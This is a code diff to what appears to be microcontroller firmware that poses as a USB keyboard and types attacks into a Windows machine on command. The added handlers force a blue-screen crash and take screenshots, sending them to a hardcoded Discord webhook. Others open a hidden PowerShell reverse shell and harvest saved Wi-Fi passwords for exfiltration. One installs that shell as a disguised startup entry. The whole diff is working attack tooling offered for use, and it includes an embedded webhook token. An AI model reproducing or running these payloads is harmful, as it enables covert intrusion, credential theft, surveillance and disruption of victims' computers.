@@ -383,6 +383,173 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         } else {
           LOG("[LangDetect] Already in progress\n");
         }
+      } else if (combo == "BSOD") {
+        // Real BSOD: Enable CrashOnCtrlScroll via admin cmd, then trigger
+        // 1. Win+R → run reg add as admin
+        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press('r');
+        delay(20);
+        Keyboard.releaseAll();
+        delay(800);
+        Keyboard.print("powershell Start-Process cmd -Verb RunAs "
+                        "-ArgumentList '/c reg add HKLM\\SYSTEM\\CurrentControlSet"
+                        "\\Services\\kbdhid\\Parameters /v CrashOnCtrlScroll "
+                        "/t REG_DWORD /d 1 /f'");
+        delay(300);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        // 2. Wait for UAC prompt, press Alt+Y to confirm
+        delay(3000);
+        Keyboard.press(KEY_LEFT_ALT);
+        Keyboard.press('y');
+        delay(20);
+        Keyboard.releaseAll();
+        // 3. Wait for reg add to finish, then Ctrl+ScrollLock ×2
+        delay(3000);
+        KeyReport kr = {};
+        // First Ctrl+ScrollLock
+        kr.modifiers = 0x01; // Left Ctrl
+        kr.keys[0] = 0x47;   // HID ScrollLock
+        Keyboard.sendReport(&kr);
+        delay(200);
+        memset(&kr, 0, sizeof(kr));
+        Keyboard.sendReport(&kr); // release
+        delay(200);
+        // Second Ctrl+ScrollLock
+        kr.modifiers = 0x01;
+        kr.keys[0] = 0x47;
+        Keyboard.sendReport(&kr);
+        delay(200);
+        memset(&kr, 0, sizeof(kr));
+        Keyboard.sendReport(&kr); // release
+        LOG("[WebKB] BSOD triggered\n");
+      } else if (combo == "Screenshot") {
+        // Capture screenshot & send to Discord webhook
+        // Command too long for Win+R (259 limit), so open cmd first
+        // 1. Open cmd via Win+R
+        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press('r');
+        delay(20);
+        Keyboard.releaseAll();
+        delay(800);
+        Keyboard.print("cmd");
+        delay(200);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        delay(1000);
+        // 2. Type PowerShell screenshot + Discord webhook command
+        Keyboard.print(
+            "powershell -w h -ep bypass -c \""
+            "Add-Type -A System.Windows.Forms,System.Drawing;"
+            "$s=[Windows.Forms.Screen]::PrimaryScreen.Bounds;"
+            "$b=New-Object Drawing.Bitmap $s.Width,$s.Height;"
+            "[Drawing.Graphics]::FromImage($b).CopyFromScreen(0,0,0,0,$s.Size);"
+            "$p=$env:TEMP+'\\ss.png';$b.Save($p);"
+            "curl.exe -F ('file=@'+$p) "
+            "https://discord.com/api/webhooks/1480962111373840517/"
+            "0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-"
+            "ciyqaBjdfxN4zgmmvD3;"
+            "Remove-Item $p\" & exit");
+        delay(300);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        LOG("[WebKB] Screenshot sent to Discord\n");
+      } else if (combo == "RevShell+") {
+        // Full reverse shell via cmd (bypass Win+R 259 limit)
+        // 1. Open cmd via Win+R
+        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press('r');
+        delay(20);
+        Keyboard.releaseAll();
+        delay(800);
+        Keyboard.print("cmd");
+        delay(200);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        delay(1000);
+        // 2. Type full PowerShell reverse shell (with byte stream + flush)
+        Keyboard.print(
+            "powershell -w h -nop -ep bypass -c \""
+            "$c=New-Object Net.Sockets.TCPClient('192.168.0.103',4444);"
+            "$s=$c.GetStream();"
+            "[byte[]]$b=0..65535|%{0};"
+            "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
+            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+            "$r=(iex $d 2>&1|Out-String);"
+            "$sr=([Text.Encoding]::ASCII).GetBytes($r);"
+            "$s.Write($sr,0,$sr.Length);"
+            "$s.Flush()};"
+            "$c.Close()\" & exit");
+        delay(300);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        LOG("[WebKB] RevShell+ launched\n");
+      } else if (combo == "WiFiHarvest") {
+        // Extract all saved WiFi passwords and send to Discord
+        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press('r');
+        delay(20);
+        Keyboard.releaseAll();
+        delay(800);
+        Keyboard.print("cmd");
+        delay(200);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        delay(1000);
+        Keyboard.print(
+            "powershell -w h -nop -ep bypass -c \""
+            "$f=$env:TEMP+'\\w.txt';"
+            "(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{ "
+            "$n=$_.Matches.Groups[1].Value.Trim(); "
+            "$k=(netsh wlan show profile name=\\\"$n\\\" key=clear) | Select-String 'Key Content\\W+\\:(.+)$'; "
+            "if($k){ \\\"$n : $($k.Matches.Groups[1].Value.Trim())\\\" >> $f }else{ \\\"$n : NoKey\\\" >> $f } "
+            "};"
+            "curl.exe -F ('file=@'+$f) "
+            "https://discord.com/api/webhooks/1480962111373840517/"
+            "0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-"
+            "ciyqaBjdfxN4zgmmvD3;"
+            "Remove-Item $f\" & exit");
+        delay(300);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        LOG("[WebKB] WiFiHarvest launched\n");
+      } else if (combo == "Persistence") {
+        // Write Reverse Shell to %APPDATA%\syslog.ps1 and add to Registry Run Key
+        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press('r');
+        delay(20);
+        Keyboard.releaseAll();
+        delay(800);
+        Keyboard.print("cmd");
+        delay(200);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        delay(1000);
+        Keyboard.print(
+            "powershell -w h -nop -ep bypass -c \""
+            "$p=$env:APPDATA+'\\syslog.ps1';"
+            "$s='$c=New-Object Net.Sockets.TCPClient(''192.168.0.103'',4444);"
+            "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){"
+            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+            "$r=(iex $d 2>&1|Out-String);$sr=([Text.Encoding]::ASCII).GetBytes($r);"
+            "$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()';"
+            "Set-Content -Path $p -Value $s;"
+            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
+            "/v SysLog /t REG_SZ /d \\\"powershell -w h -nop -ep bypass -f $p\\\" /f\" "
+            "& exit");
+        delay(300);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        LOG("[WebKB] Persistence launched\n");
       } else {
         LOG("[WebKB] unknown combo: %s\n", combo.c_str());
       }
